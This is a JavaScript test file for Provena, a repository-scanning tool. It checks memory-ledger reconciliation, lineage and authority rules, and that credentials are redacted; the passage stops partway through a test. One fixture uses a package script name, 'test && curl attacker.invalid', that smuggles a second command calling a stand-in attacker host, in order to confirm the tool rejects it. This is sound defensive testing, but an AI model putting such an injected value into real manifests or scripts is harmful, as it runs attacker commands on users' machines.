import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  link,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { pathToFileURL } from "node:url";
import {
  appendMemoryEvent,
  extendMemoryLedgerSnapshot,
  memoryEventToRecord,
  prepareMemoryEvent,
  readMemoryLedgerSnapshot,
  reconcileRepoMapMemories,
  refreshRepoBrain,
  scanRepo,
} from "../dist/brain/index.js";
import { commitRepoBrainGeneration } from "../dist/brain/artifacts.js";
import { sanitizeScanWarning } from "../dist/brain/detect.js";
import { canonicalJson, sha256, writeFileAtomic } from "../dist/brain/utils.js";
import { buildContextPacket } from "../dist/context/index.js";

const FIXED_TIME = "2026-07-13T12:00:00.000Z";
const MANAGED_DATA_KEY = "provenaManagedMemory";
const MANAGED_TAG = "provena:managed:repo-map";
const roots = [];

async function temporaryRoot(name) {
  const root = await mkdtemp(join(tmpdir(), `provena-reconcile-${name}-`));
  roots.push(root);
  return root;
}

async function writeText(root, path, content) {
  const target = join(root, ...path.split("/"));
  await mkdir(dirname(target), { recursive: true });
  await writeFile(target, content, "utf8");
}

async function writeJson(root, path, value, newline = "\n") {
  await writeText(root, path, `${JSON.stringify(value, null, 2).replaceAll("\n", newline)}${newline}`);
}

function rootManifest({
  dependencies = ["alpha"],
  manager = "npm@10.0.0",
  scripts = { build: "ignored by RepoMap", test: "also ignored" },
  name = "caf\u00e9-app",
} = {}) {
  return {
    name,
    packageManager: manager,
    scripts,
    dependencies: Object.fromEntries(dependencies.map((dependency) => [dependency, "1.0.0"])),
  };
}

async function writeCoreRepo(root, options = {}) {
  await writeJson(root, "package.json", rootManifest(options));
  await writeJson(root, "workspace/package.json", {
    name: "workspace-child",
    packageManager: "yarn@4.1.0",
    scripts: { lint: "eslint ." },
    dependencies: { child: "1.0.0" },
  });
}

function metadata(event) {
  return event.structuredData[MANAGED_DATA_KEY];
}

function managedEvents(snapshot, predicate = () => true) {
  return snapshot.events.filter(
    (event) => event.tags.includes(MANAGED_TAG) && predicate(metadata(event), event),
  );
}

function assertMeasured(result) {
  const value = result.reconciliation;
  assert(Number.isFinite(value.durationMs) && value.durationMs >= 0);
  assert.equal(
    value.candidates,
    value.added + value.noops + value.superseded + value.conflicts,
    "every current candidate must have exactly one reconciliation outcome",
  );
}

function digest(value) {
  return createHash("sha256").update(value).digest("hex");
}

async function generationBytes(root) {
  const manifestPath = join(root, ".provena", "manifest.json");
  const manifest = JSON.parse(await readFile(manifestPath, "utf8"));
  const paths = [...manifest.artifacts.map((artifact) => artifact.path), ".provena/manifest.json"];
  return Object.fromEntries(
    await Promise.all(paths.map(async (path) => [path, (await readFile(join(root, ...path.split("/")))).toString("base64")])),
  );
}

async function allPaths(root, relative = "") {
  const directory = join(root, ...relative.split("/").filter(Boolean));
  let entries;
  try {
    entries = await readdir(directory, { withFileTypes: true });
  } catch (error) {
    if (error.code === "ENOENT") return [];
    throw error;
  }
  const paths = [];
  for (const entry of entries) {
    const path = relative ? `${relative}/${entry.name}` : entry.name;
    if (entry.isDirectory()) paths.push(...await allPaths(root, path));
    else paths.push(path);
  }
  return paths.sort();
}

function emptySnapshot() {
  return { events: [], rawLedger: "", memoryFingerprint: sha256(Buffer.alloc(0)), bytes: 0 };
}

function snapshotFromEvents(events) {
  const rawLedger = events.map((event) => canonicalJson(memoryEventToRecord(event))).join("");
  return {
    events,
    rawLedger,
    memoryFingerprint: sha256(Buffer.from(rawLedger, "utf8")),
    bytes: Buffer.byteLength(rawLedger, "utf8"),
  };
}

async function runRefreshProcess(root) {
  const moduleUrl = pathToFileURL(join(process.cwd(), "dist", "brain", "index.js")).href;
  const script = `import { refreshRepoBrain } from ${JSON.stringify(moduleUrl)}; const result = await refreshRepoBrain(process.env.PROVENA_TEST_ROOT); process.stdout.write(JSON.stringify([result.reconciliation.added, result.reconciliation.noops]));`;
  return await new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ["--input-type=module", "--eval", script], {
      env: { ...process.env, PROVENA_TEST_ROOT: root },
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const stdout = [];
    const stderr = [];
    child.stdout.on("data", (chunk) => stdout.push(chunk));
    child.stderr.on("data", (chunk) => stderr.push(chunk));
    child.once("error", reject);
    child.once("close", (code) => {
      if (code === 0) resolve(JSON.parse(Buffer.concat(stdout).toString("utf8")));
      else reject(new Error(`refresh child exited ${code}: ${Buffer.concat(stderr).toString("utf8")}`));
    });
  });
}

function runGit(root, ...args) {
  const result = spawnSync("git", args, { cwd: root, encoding: "utf8", windowsHide: true });
  assert.equal(result.status, 0, result.stderr || result.stdout);
}

async function publishLedgerThenCrash(root, rawLedger) {
  const lockUrl = pathToFileURL(join(process.cwd(), "dist", "brain", "lock.js")).href;
  const script = `
    import { writeFile } from "node:fs/promises";
    import { withRepoMemoryLock } from ${JSON.stringify(lockUrl)};
    await withRepoMemoryLock(process.env.PROVENA_TEST_ROOT, async () => {
      await writeFile(process.env.PROVENA_TEST_LEDGER, Buffer.from(process.env.PROVENA_TEST_LEDGER_B64, "base64"));
      process.stdout.write("ledger-published\\n");
      await new Promise(() => setInterval(() => undefined, 1_000));
    });
  `;
  await new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ["--input-type=module", "--eval", script], {
      env: {
        ...process.env,
        PROVENA_TEST_ROOT: root,
        PROVENA_TEST_LEDGER: join(root, ".provena", "memory", "events.jsonl"),
        PROVENA_TEST_LEDGER_B64: Buffer.from(rawLedger, "utf8").toString("base64"),
      },
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const stdout = [];
    const stderr = [];
    let killed = false;
    child.stdout.on("data", (chunk) => {
      stdout.push(chunk);
      if (!killed && Buffer.concat(stdout).includes(Buffer.from("ledger-published\n"))) {
        killed = true;
        if (!child.kill("SIGKILL")) reject(new Error("failed to terminate crash fixture"));
      }
    });
    child.stderr.on("data", (chunk) => stderr.push(chunk));
    child.once("error", reject);
    child.once("close", (code, signal) => {
      if (killed && (code !== 0 || signal)) resolve();
      else reject(new Error(
        `crash fixture exited before termination (${code ?? signal}): ${Buffer.concat(stderr).toString("utf8")}`,
      ));
    });
  });
}

try {
  // Persisted and emitted scan diagnostics must remain single-line and credential-safe.
  const sanitizedControlWarning = sanitizeScanWarning("bad\u001b[31m\n\u202esequence");
  assert(!/[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/u.test(sanitizedControlWarning));
  const warningCredential = "Bearer abcdefghijklmnopqrstuvwxyz1234";
  const redactedWarning = sanitizeScanWarning(`skipping ${warningCredential}/large.txt`);
  assert.match(redactedWarning, /redacted/);
  assert(!redactedWarning.includes(warningCredential));

  const warningRoot = await temporaryRoot("warning-redaction");
  await writeText(warningRoot, `${warningCredential}/large.txt`, "too large");
  const emittedWarnings = [];
  const warningMap = await scanRepo(warningRoot, {
    maxFileBytes: 1,
    warn: (warning) => emittedWarnings.push(warning),
  });
  assert.equal(warningMap.scan.complete, false);
  assert(warningMap.scan.warnings.some((warning) => warning.includes("redacted")));
  assert(emittedWarnings.some((warning) => warning.includes("redacted")));
  for (const warning of [...warningMap.scan.warnings, ...emittedWarnings]) {
    assert(!warning.includes(warningCredential));
    assert(!/[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/u.test(warning));
  }

  // Source-grounded ADDs, deterministic identity, and a true unchanged NOOP.
  const core = await temporaryRoot("core");
  await writeCoreRepo(core);
  let timer = [10, 17];
  const first = await refreshRepoBrain(core, {
    now: () => new Date(FIXED_TIME),
    clock: () => timer.shift(),
  });
  assertMeasured(first);
  assert.deepEqual(first.reconciliation, {
    candidates: 5,
    added: 5,
    noops: 0,
    superseded: 0,
    retracted: 0,
    deferred: 0,
    conflicts: 0,
    durationMs: 7,
  });
  const firstManaged = managedEvents(first.memory);
  assert.equal(firstManaged.length, 5, "one package fact and one workflow per command are generated");
  for (const event of firstManaged) {
    const managed = metadata(event);
    const source = first.map.files.find((file) => file.path === managed.candidate.manifestPath);
    assert(source, `missing scanned source for ${managed.candidate.manifestPath}`);
    assert.equal(managed.generator, "provena.repo-map");
    assert.equal(managed.version, 1);
    assert.equal(managed.action, "ADD");
    assert.equal(managed.predecessorId, null);
    assert.match(managed.logicalKey, /^repo-map-(?:package|command):[a-f0-9]{20}$/);
    assert.match(managed.candidateFingerprint, /^[a-f0-9]{64}$/);
    assert.equal(event.kind, managed.candidate.type === "package" ? "fact" : "workflow");
    assert.equal(event.authority, "tool");
    assert.equal(event.provenance.method, "observed");
    assert.equal(event.sensitivity, "internal");
    assert.deepEqual(event.sources, [{ path: source.path, blob: source.sha256 }]);
    assert(!["decision", "preference"].includes(event.kind));
    assert(!Object.hasOwn(event.structuredData, "rationale"));
  }

  const deterministicRoot = await temporaryRoot("deterministic");
  const equivalentMap = structuredClone(first.map);
  equivalentMap.files.reverse();
  equivalentMap.packages.reverse();
  equivalentMap.commands.reverse();
  equivalentMap.packages[0].dependencies.reverse();
  const unicodePackage = equivalentMap.packages.find((pkg) => pkg.name === "caf\u00e9-app");
  unicodePackage.name = unicodePackage.name.normalize("NFD");
  timer = [2, 99];
  const deterministic = await reconcileRepoMapMemories(
    deterministicRoot,
    equivalentMap,
    emptySnapshot(),
    { now: () => new Date(FIXED_TIME), clock: () => timer.shift() },
  );
  assert.deepEqual(
    deterministic.appended.map((event) => canonicalJson(memoryEventToRecord(event))),
    firstManaged.map((event) => canonicalJson(memoryEventToRecord(event))),
    "array order, absolute root, Unicode representation, and timer values cannot change canonical events",
  );

  const spacedPaths = await temporaryRoot("spaced-paths");
  await writeJson(spacedPaths, " pkg/package.json", rootManifest({ name: "leading-space", scripts: {} }));
  await writeJson(spacedPaths, "pkg/package.json", rootManifest({ name: "plain", scripts: {} }));
  const spacedResult = await refreshRepoBrain(spacedPaths, { now: () => new Date(FIXED_TIME) });
  assert.equal(spacedResult.reconciliation.added, 2);
  assert.deepEqual(
    managedEvents(spacedResult.memory).map((event) => event.sources[0].path).sort(),
    [" pkg/package.json", "pkg/package.json"],
    "source paths retain significant leading whitespace and cannot collapse",
  );
  const unicodePathsRoot = await temporaryRoot("unicode-paths");
  const unicodePathsMap = structuredClone(spacedResult.map);
  const unicodePaths = ["cafe\u0301/package.json", "caf\u00e9/package.json"];
  unicodePathsMap.files = unicodePaths.map((path, index) => ({
    ...unicodePathsMap.files[index],
    id: `file:unicode-${index}`,
    path,
    sha256: `${index + 1}`.repeat(64),
  }));
  unicodePathsMap.packages = unicodePaths.map((path, index) => ({
    ...unicodePathsMap.packages[index],
    id: `package:unicode-${index}`,
    manifestPath: path,
    path: path.slice(0, -"/package.json".length),
    name: `unicode-${index}`,
  }));
  unicodePathsMap.commands = [];
  const unicodePathResult = await reconcileRepoMapMemories(
    unicodePathsRoot,
    unicodePathsMap,
    emptySnapshot(),
    { now: () => new Date(FIXED_TIME) },
  );
  assert.deepEqual(
    unicodePathResult.appended.map((event) => event.sources[0].path).sort(),
    unicodePaths.sort(),
    "NFC and NFD repository paths remain distinct exact citations",
  );

  const beforeNoop = await generationBytes(core);
  const ledgerBeforeNoop = await readFile(join(core, ".provena", "memory", "events.jsonl"));
  let observationCalls = 0;
  timer = [100, 112.5];
  const noop = await refreshRepoBrain(core, {
    now: () => {
      observationCalls += 1;
      return new Date("2030-01-01T00:00:00.000Z");
    },
    clock: () => timer.shift(),
  });
  assertMeasured(noop);
  assert.equal(observationCalls, 0, "NOOP candidates must not consume the observation clock");
  assert.equal(noop.reconciliation.noops, 5);
  assert.equal(noop.reconciliation.durationMs, 12.5);
  assert.deepEqual(await generationBytes(core), beforeNoop, "timing must never enter persisted artifacts");
  assert((await readFile(join(core, ".provena", "memory", "events.jsonl"))).equals(ledgerBeforeNoop));
  assert.equal(noop.memory.memoryFingerprint, first.memory.memoryFingerprint);

  // Package A-B-A transitions affect only the package lineage; package-manager changes affect commands only.
  await writeCoreRepo(core, { dependencies: ["beta"] });
  const stateB = await refreshRepoBrain(core, { now: () => new Date("2026-07-13T11:00:00.000Z") });
  assertMeasured(stateB);
  assert.equal(stateB.reconciliation.superseded, 1);
  assert.equal(stateB.reconciliation.noops, 4);
  await writeCoreRepo(core, { dependencies: ["alpha"] });
  const stateA2 = await refreshRepoBrain(core, { now: () => new Date("2026-07-13T13:00:00.000Z") });
  assertMeasured(stateA2);
  assert.equal(stateA2.reconciliation.superseded, 1);
  assert.equal(stateA2.reconciliation.noops, 4);
  const rootPackages = managedEvents(
    stateA2.memory,
    (managed) => managed.candidate.type === "package" && managed.candidate.manifestPath === "package.json",
  );
  assert.deepEqual(rootPackages.map((event) => metadata(event).action), ["ADD", "SUPERSEDE", "SUPERSEDE"]);
  assert.notEqual(rootPackages[0].id, rootPackages[2].id, "A-B-A ids are predecessor-bound");
  assert.deepEqual(rootPackages[1].supersedes, [rootPackages[0].id]);
  assert.deepEqual(rootPackages[2].supersedes, [rootPackages[1].id]);
  assert.equal(rootPackages[1].createdAt, FIXED_TIME, "a backward wall clock cannot backdate a successor");
  assert.deepEqual(
    managedEvents(stateA2.memory, (managed) => managed.candidate.type === "command").map((event) => metadata(event).action),
    ["ADD", "ADD", "ADD"],
    "dependency-name changes cannot churn command lineages",
  );

  await writeCoreRepo(core, { dependencies: ["alpha"], manager: "pnpm@9.0.0" });
  const managerChange = await refreshRepoBrain(core, { now: () => new Date("2026-07-13T14:00:00.000Z") });
  assertMeasured(managerChange);
  assert.equal(managerChange.reconciliation.superseded, 2, "only the two root commands change manager");
  assert.equal(managerChange.reconciliation.noops, 3, "both package facts and the child command remain stable");
  const childCommand = managedEvents(
    managerChange.memory,
    (managed) => managed.candidate.type === "command" && managed.candidate.manifestPath === "workspace/package.json",
  );
  assert.equal(childCommand.length, 1);
  assert.equal(metadata(childCommand[0]).candidate.command, "yarn run lint");

  await writeCoreRepo(core, {
    dependencies: ["alpha"],
    manager: "pnpm@9.0.0",
    scripts: { test: "body changes are intentionally invisible" },
  });
  const removedScript = await refreshRepoBrain(core, { now: () => new Date("2026-07-13T15:00:00.000Z") });
  assertMeasured(removedScript);
  assert.equal(removedScript.reconciliation.retracted, 1);
  assert.equal(removedScript.reconciliation.noops, 4);
  const repeatedRemovalBytes = await readFile(join(core, ".provena", "memory", "events.jsonl"));
  const repeatedRemoval = await refreshRepoBrain(core);
  assertMeasured(repeatedRemoval);
  assert.equal(repeatedRemoval.reconciliation.retracted, 0);
  assert((await readFile(join(core, ".provena", "memory", "events.jsonl"))).equals(repeatedRemovalBytes));
  await writeCoreRepo(core, { dependencies: ["alpha"], manager: "pnpm@9.0.0" });
  const restoredScript = await refreshRepoBrain(core, { now: () => new Date("2026-07-13T16:00:00.000Z") });
  assertMeasured(restoredScript);
  assert.equal(restoredScript.reconciliation.superseded, 1);
  const buildLineage = managedEvents(
    restoredScript.memory,
    (managed) => managed.candidate.type === "command" && managed.candidate.name === "build",
  );
  assert.deepEqual(
    buildLineage.map((event) => metadata(event).action),
    ["ADD", "SUPERSEDE", "RETRACT", "SUPERSEDE"],
  );
  assert.equal(new Set(buildLineage.map((event) => event.id)).size, 4);
  for (let index = 1; index < buildLineage.length; index += 1) {
    assert.deepEqual(buildLineage[index].supersedes, [buildLineage[index - 1].id]);
  }

  const finalLedger = await readFile(join(core, ".provena", "memory", "events.jsonl"));
  const finalLedgerEntry = restoredScript.manifest.artifacts.find(
    (artifact) => artifact.path === ".provena/memory/events.jsonl",
  );
  assert.equal(restoredScript.memory.memoryFingerprint, digest(finalLedger));
  assert.equal(finalLedgerEntry.sha256, digest(finalLedger));
  assert.equal(finalLedgerEntry.bytes, finalLedger.byteLength);
  const packet = buildContextPacket(
    restoredScript.map,
    restoredScript.graph,
    restoredScript.memory,
    { query: "build workflow", maxCharacters: 2_000, maxTokens: 500 },
  );
  assert.equal(packet.memoryFingerprint, digest(finalLedger));
  assert.equal(
    packet.items.filter((item) => item.type === "command" && item.title === "build").length,
    1,
    "the current command is emitted once",
  );
  const activeBuildMemoryId = buildLineage.at(-1).id;
  assert(
    !packet.items.some(
      (item) => item.type === "memory" && item.citations.some((citation) => citation.memoryId === activeBuildMemoryId),
    ),
    "the managed workflow remains durable but does not duplicate the live command in a packet",
  );
  const packagePacket = buildContextPacket(
    restoredScript.map,
    restoredScript.graph,
    restoredScript.memory,
    { query: "package café-app", maxCharacters: 2_000, maxTokens: 500 },
  );
  assert(
    packagePacket.items.some((item) => item.type === "memory"),
    "non-duplicate managed package facts remain available to context retrieval",
  );

  // Existing, excluded, capped, and malformed manifests defer; a confirmed deletion retracts.
  const completeness = await temporaryRoot("completeness");
  await writeJson(completeness, "package.json", rootManifest({ scripts: { test: "node test" } }));
  const completeFirst = await refreshRepoBrain(completeness, { now: () => new Date(FIXED_TIME) });
  assert.equal(completeFirst.reconciliation.added, 2);
  const cappedWarnings = [];
  const capped = await refreshRepoBrain(completeness, {
    maxFiles: 0,
    warn: (warning) => cappedWarnings.push(warning),
  });
  assert.equal(capped.reconciliation.deferred, 2);
  assert(cappedWarnings.some((warning) => warning.includes("file cap")));
  const excluded = await refreshRepoBrain(completeness, { excludePatterns: ["package.json"] });
  assert.equal(excluded.reconciliation.deferred, 2);
  await writeText(completeness, "package.json", "{ malformed\n");
  const malformed = await refreshRepoBrain(completeness);
  assert.equal(malformed.reconciliation.deferred, 2);
  assert.equal(malformed.reconciliation.retracted, 0);
  await rm(join(completeness, "package.json"));
  await writeText(completeness, "README.md", "keep the scan non-empty\n");
  const incompleteDeletion = await refreshRepoBrain(completeness, { maxFiles: 0 });
  assert.equal(incompleteDeletion.map.scan.complete, false);
  assert.equal(incompleteDeletion.reconciliation.deferred, 2);
  assert.equal(incompleteDeletion.reconciliation.retracted, 0);
  const deleted = await refreshRepoBrain(completeness, { now: () => new Date("2026-07-13T13:00:00.000Z") });
  assert.equal(deleted.reconciliation.retracted, 2);
  assert.equal(deleted.reconciliation.deferred, 0);

  const invalidShape = await temporaryRoot("invalid-node-shape");
  await writeJson(invalidShape, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await refreshRepoBrain(invalidShape, { now: () => new Date(FIXED_TIME) });
  await writeJson(invalidShape, "package.json", {
    name: "invalid-shape",
    scripts: ["node test"],
    dependencies: ["alpha"],
  });
  const invalidShapeResult = await refreshRepoBrain(invalidShape);
  assert.equal(invalidShapeResult.map.scan.complete, false);
  assert.equal(invalidShapeResult.reconciliation.deferred, 2);
  assert.equal(invalidShapeResult.reconciliation.retracted, 0);

  const enumerationFailure = await temporaryRoot("enumeration-failure");
  await writeJson(enumerationFailure, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await refreshRepoBrain(enumerationFailure, { now: () => new Date(FIXED_TIME) });
  const enumerationWarnings = [];
  const incompleteEnumeration = await refreshRepoBrain(enumerationFailure, {
    includePatterns: ["\u0000"],
    warn: (warning) => enumerationWarnings.push(warning),
  });
  assert.equal(incompleteEnumeration.map.scan.complete, false);
  assert.deepEqual(incompleteEnumeration.map.scan.warnings, [
    "repository candidate enumeration was incomplete",
  ]);
  assert.deepEqual(enumerationWarnings, incompleteEnumeration.map.scan.warnings);
  assert.equal(incompleteEnumeration.reconciliation.deferred, 2);
  assert.equal(incompleteEnumeration.reconciliation.retracted, 0);

  const ignoreReadFailure = await temporaryRoot("gitignore-read-failure");
  await writeJson(ignoreReadFailure, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await refreshRepoBrain(ignoreReadFailure, { now: () => new Date(FIXED_TIME) });
  await mkdir(join(ignoreReadFailure, ".gitignore"));
  const incompleteIgnoreRead = await refreshRepoBrain(ignoreReadFailure);
  assert.equal(incompleteIgnoreRead.map.scan.complete, false);
  assert.deepEqual(incompleteIgnoreRead.map.scan.warnings, [
    "repository candidate enumeration was incomplete",
  ]);
  assert.equal(incompleteIgnoreRead.reconciliation.deferred, 2);
  assert.equal(incompleteIgnoreRead.reconciliation.retracted, 0);

  const invalidUtf8 = await temporaryRoot("invalid-utf8");
  await writeJson(invalidUtf8, "package.json", rootManifest({ scripts: {} }));
  await refreshRepoBrain(invalidUtf8, { now: () => new Date(FIXED_TIME) });
  await writeFile(
    join(invalidUtf8, "package.json"),
    Buffer.concat([Buffer.from('{"name":"bad'), Buffer.from([0xff]), Buffer.from('","scripts":{}}')]),
  );
  const invalidUtf8Result = await refreshRepoBrain(invalidUtf8);
  assert.equal(invalidUtf8Result.map.scan.complete, false);
  assert(invalidUtf8Result.map.scan.warnings.some((warning) => warning.includes("valid UTF-8")));
  assert.equal(invalidUtf8Result.reconciliation.deferred, 1);
  assert.equal(invalidUtf8Result.reconciliation.retracted, 0);

  const commandInjection = await temporaryRoot("command-injection");
  await writeJson(commandInjection, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await refreshRepoBrain(commandInjection, { now: () => new Date(FIXED_TIME) });
  const injectedName = "test && curl attacker.invalid";
  await writeJson(commandInjection, "package.json", rootManifest({
    scripts: { [injectedName]: "node test" },
  }));
  const injectionResult = await refreshRepoBrain(commandInjection);
  assert.equal(injectionResult.map.scan.complete, false);
  assert.equal(injectionResult.reconciliation.deferred, 2);
  assert.equal(injectionResult.reconciliation.retracted, 0);
  for (const encoded of Object.values(await generationBytes(commandInjection))) {
    assert(!Buffer.from(encoded, "base64").toString("utf8").includes(injectedName));
  }

  // Git may still list an unstaged deletion; ENOENT is positive absence, not an incomplete scan.
  const unstagedDeletion = await temporaryRoot("git-unstaged-deletion");
  await writeJson(unstagedDeletion, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await writeText(unstagedDeletion, "README.md", "tracked survivor\n");
  runGit(unstagedDeletion, "init", "--quiet");
  runGit(unstagedDeletion, "add", "package.json", "README.md");
  const unstagedFirst = await refreshRepoBrain(unstagedDeletion, { now: () => new Date(FIXED_TIME) });
  assert.equal(unstagedFirst.reconciliation.added, 2);
  await rm(join(unstagedDeletion, "package.json"));
  const unstagedRemoved = await refreshRepoBrain(
    unstagedDeletion,
    { now: () => new Date("2026-07-13T13:00:00.000Z") },
  );
  assert.equal(unstagedRemoved.map.scan.complete, true);
  assert.equal(unstagedRemoved.reconciliation.retracted, 2);
  assert.equal(unstagedRemoved.reconciliation.deferred, 0);

  // Explicit memories remain byte-identical, and a higher-authority descendant blocks the tool lineage.
  const authority = await temporaryRoot("authority");
  await writeJson(authority, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await appendMemoryEvent(authority, {
    id: "explicit-repo-fact",
    kind: "fact",
    subjectType: "repo",
    title: "Maintainer-authored fact",
    body: "This explicit record is outside Provena's managed namespace.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    sources: [{ path: "package.json" }],
  }, { now: () => new Date(FIXED_TIME) });
  const authorityFirst = await refreshRepoBrain(authority, { now: () => new Date(FIXED_TIME) });
  const managedPackageHead = managedEvents(
    authorityFirst.memory,
    (managed) => managed.candidate.type === "package",
  ).at(-1);
  await appendMemoryEvent(authority, {
    id: "human-package-override",
    kind: "fact",
    subjectType: "repo",
    title: "Human package interpretation",
    body: "A maintainer now owns this generated package lineage.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    supersedes: [managedPackageHead.id],
    sources: [{ path: "package.json" }],
  }, { now: () => new Date("2026-07-13T13:00:00.000Z") });
  const protectedLedger = await readFile(join(authority, ".provena", "memory", "events.jsonl"));
  await writeJson(authority, "package.json", rootManifest({ dependencies: ["changed"], scripts: { test: "node test" } }));
  const conflict = await refreshRepoBrain(authority);
  assertMeasured(conflict);
  assert.equal(conflict.reconciliation.conflicts, 1);
  assert.equal(conflict.reconciliation.noops, 1);
  assert((await readFile(join(authority, ".provena", "memory", "events.jsonl"))).equals(protectedLedger));
  assert.equal(conflict.memory.events.filter((event) => event.id === "explicit-repo-fact").length, 1);
  assert.equal(conflict.memory.events.filter((event) => event.id === "human-package-override").length, 1);

  await appendMemoryEvent(authority, {
    id: "human-package-tombstone",
    kind: "fact",
    subjectType: "repo",
    title: "Retracted human package interpretation",
    body: "The maintainer retracted the interpretation without returning ownership to automation.",
    status: "retracted",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    supersedes: ["human-package-override"],
    sources: [{ path: "package.json" }],
  }, { now: () => new Date("2026-07-13T14:00:00.000Z") });
  const tombstoneLedger = await readFile(join(authority, ".provena", "memory", "events.jsonl"));
  await writeJson(authority, "package.json", rootManifest({
    dependencies: ["changed-again"],
    scripts: { test: "node test" },
  }));
  const tombstoneConflict = await refreshRepoBrain(authority);
  assert.equal(tombstoneConflict.reconciliation.conflicts, 1);
  assert.equal(tombstoneConflict.reconciliation.noops, 1);
  assert(
    (await readFile(join(authority, ".provena", "memory", "events.jsonl"))).equals(tombstoneLedger),
    "a higher-authority retraction remains the governing leaf",
  );
  const protectedGeneration = await generationBytes(authority);
  const protectedSecret = "Bearer abcdefghijklmnopqrstuvwxyz1234";
  await writeJson(authority, "package.json", rootManifest({
    name: protectedSecret,
    scripts: { test: "node test" },
  }));
  await assert.rejects(refreshRepoBrain(authority), (error) => {
    assert.match(error.message, /credential|private key/);
    assert(!error.message.includes(protectedSecret));
    return true;
  });
  assert.deepEqual(
    await generationBytes(authority),
    protectedGeneration,
    "candidate secret validation runs before authority-conflict outcome branching",
  );

  // An override created from a stale snapshot protects the whole managed lineage, not only its newest head.
  const staleAuthority = await temporaryRoot("stale-authority");
  await writeJson(staleAuthority, "package.json", rootManifest({ scripts: {} }));
  const staleFirst = await refreshRepoBrain(staleAuthority, { now: () => new Date(FIXED_TIME) });
  const staleRoot = managedEvents(staleFirst.memory)[0];
  await writeJson(staleAuthority, "package.json", rootManifest({ dependencies: ["second"], scripts: {} }));
  const staleSecond = await refreshRepoBrain(
    staleAuthority,
    { now: () => new Date("2026-07-13T13:00:00.000Z") },
  );
  await appendMemoryEvent(staleAuthority, {
    id: "stale-human-override",
    kind: "fact",
    subjectType: "repo",
    title: "Stale-snapshot interpretation",
    body: "A maintainer branched from an older generated observation.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    supersedes: [staleRoot.id],
    sources: [{ path: "package.json" }],
  }, { now: () => new Date("2026-07-13T14:00:00.000Z") });
  const staleProtectedLedger = await readFile(join(staleAuthority, ".provena", "memory", "events.jsonl"));
  await writeJson(staleAuthority, "package.json", rootManifest({ dependencies: ["third"], scripts: {} }));
  const staleConflict = await refreshRepoBrain(staleAuthority);
  assert.equal(staleConflict.reconciliation.conflicts, 1);
  assert.equal(managedEvents(staleConflict.memory).length, 2);
  assert(
    (await readFile(join(staleAuthority, ".provena", "memory", "events.jsonl"))).equals(staleProtectedLedger),
  );
  const staleManagedHead = managedEvents(staleSecond.memory).at(-1);
  assert.notEqual(staleManagedHead.id, staleRoot.id);
  await appendMemoryEvent(staleAuthority, {
    id: "stale-unmanaged-tool-fork",
    kind: "fact",
    subjectType: "repo",
    title: "Unmanaged tool fork",
    body: "An unreserved tool event cannot take ownership of a managed lineage.",
    provenance: { actor: "external-tool", method: "observed" },
    authority: "tool",
    supersedes: [staleRoot.id],
    sources: [{ path: "package.json" }],
  }, { now: () => new Date("2026-07-13T15:00:00.000Z") });
  await assert.rejects(
    refreshRepoBrain(staleAuthority),
    /invalid managed repo-map memory lineage \(unmanaged-tool-descendant\)/,
  );

  // A valid explicit diamond above a managed head is traversed once and remains authoritative.
  const diamond = await temporaryRoot("diamond");
  await writeJson(diamond, "package.json", rootManifest({ scripts: {} }));
  const diamondFirst = await refreshRepoBrain(diamond, { now: () => new Date(FIXED_TIME) });
  const diamondHead = managedEvents(diamondFirst.memory)[0];
  for (const [id, title] of [["diamond-left", "Left interpretation"], ["diamond-right", "Right interpretation"]]) {
    await appendMemoryEvent(diamond, {
      id,
      kind: "fact",
      subjectType: "repo",
      title,
      body: "A human interpretation branching from the generated fact.",
      provenance: { actor: "maintainer", method: "explicit" },
      authority: "human",
      supersedes: [diamondHead.id],
      sources: [{ path: "package.json" }],
    }, { now: () => new Date("2026-07-13T13:00:00.000Z") });
  }
  await appendMemoryEvent(diamond, {
    id: "diamond-merge",
    kind: "fact",
    subjectType: "repo",
    title: "Merged interpretation",
    body: "The maintainer reconciled both branches without creating a cycle.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    supersedes: ["diamond-left", "diamond-right"],
    sources: [{ path: "package.json" }],
  }, { now: () => new Date("2026-07-13T14:00:00.000Z") });
  const diamondResult = await refreshRepoBrain(diamond);
  assert.equal(diamondResult.reconciliation.conflicts, 1);
  assert.equal(diamondResult.memory.events.filter((event) => event.id === "diamond-merge").length, 1);

  // Malformed, forked, orphaned, and reserved-ID lineages fail closed with bounded errors.
  const structural = await temporaryRoot("structural");
  await writeJson(structural, "package.json", rootManifest({ scripts: {} }));
  const structuralMap = await scanRepo(structural);
  const structuralInitial = await reconcileRepoMapMemories(
    structural,
    structuralMap,
    emptySnapshot(),
    { now: () => new Date(FIXED_TIME) },
  );
  assert.equal(structuralInitial.appended.length, 1);
  const invalidMetadata = structuredClone(structuralInitial.appended[0]);
  metadata(invalidMetadata).version = 2;
  await assert.rejects(
    reconcileRepoMapMemories(structural, structuralMap, snapshotFromEvents([invalidMetadata])),
    (error) => {
      assert.equal(error.message, "invalid managed repo-map memory lineage (metadata-values)");
      assert(!error.message.includes("café-app"));
      return true;
    },
  );
  const noncanonicalMetadata = structuredClone(structuralInitial.appended[0]);
  metadata(noncanonicalMetadata).candidate.dependencies = ["zeta", "zeta", "alpha"];
  await assert.rejects(
    reconcileRepoMapMemories(
      structural,
      structuralMap,
      snapshotFromEvents([noncanonicalMetadata]),
    ),
    /invalid managed repo-map memory lineage \(metadata-normalization\)/,
  );

